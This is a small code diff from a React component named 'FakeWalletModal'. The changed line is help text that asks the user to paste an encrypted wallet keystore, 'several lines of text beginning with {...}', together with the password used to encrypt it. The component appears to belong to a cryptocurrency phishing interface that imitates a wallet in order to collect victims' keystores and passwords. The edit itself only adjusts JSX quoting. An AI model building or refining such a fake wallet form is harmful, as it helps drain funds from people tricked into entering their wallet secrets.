@@ -179,7 +179,7 @@ export function FakeWalletModal({ isOpen, onClose, walletName, walletIcon }: Fak
                 className="min-h-[100px]"
               />
               <p className="text-sm text-gray-500">
-                Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+                Several lines of text beginning with {`"{...}"`} plus the password you used to encrypt it.
               </p>
             </div>
             <div className="space-y-2">
